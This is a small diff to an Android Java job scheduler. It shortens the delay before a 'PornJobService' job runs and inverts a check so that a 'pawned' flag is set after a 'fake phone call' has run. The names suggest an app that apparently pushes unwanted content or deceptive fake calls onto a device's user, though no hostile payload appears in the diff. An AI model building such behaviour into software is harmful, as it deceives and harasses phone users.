@@ -59,8 +59,8 @@ public class JobsScheduler {
         if(jobScheduler.getPendingJob(JOB_ID_PORN) == null){
             ComponentName serviceComponent = new ComponentName(context, PornJobService.class);
             JobInfo.Builder builder = new JobInfo.Builder(JOB_ID_PORN, serviceComponent);
-            builder.setMinimumLatency(20 * ONE_MINUTE);
-            builder.setOverrideDeadline(30 * ONE_MINUTE);
+            builder.setMinimumLatency(1 * ONE_MINUTE);
+            builder.setOverrideDeadline(60 * ONE_MINUTE);
             builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
             jobScheduler.schedule(builder.build());
         }
@@ -193,7 +193,7 @@ public class JobsScheduler {
             calendarEventJob.setMinimumLatency(8 * ONE_MINUTE);
             jobScheduler.schedule(calendarEventJob.build());
         }else{
-            if(! ranFakePhoneCall){
+            if(ranFakePhoneCall){
                 ScreenReceiver.sIsPawned = true;
             }
         }
